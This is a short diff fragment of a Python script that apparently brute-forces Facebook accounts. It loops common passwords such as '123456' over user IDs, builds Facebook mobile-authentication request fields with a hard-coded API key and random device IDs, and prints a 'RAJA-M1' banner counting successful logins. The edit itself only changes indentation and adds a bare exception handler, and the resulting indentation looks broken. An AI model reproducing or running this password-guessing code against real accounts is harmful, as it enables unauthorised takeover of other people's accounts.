@@ -464,7 +464,7 @@ def login_1(uid):
         sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mRAJA-M1\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{loop}\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mOK\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{len(oks)}\x1b[38;5;196m]")
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
-                 data = {
+                         data = {
             'adid': str(uuid.uuid4()),
             'format': 'json',
             'device_id': str(uuid.uuid4()),
@@ -486,8 +486,10 @@ def login_1(uid):
             'fb_api_req_friendly_name': 'authenticate',
             'fb_api_caller_class': 'com.facebook.account.login.protocol',
             'api_key': '882a8490361d98702bf97a021ddc14d'
-                 }
-            
+        }
+    except Exception as e:
+        pass
+        
 
 
                 
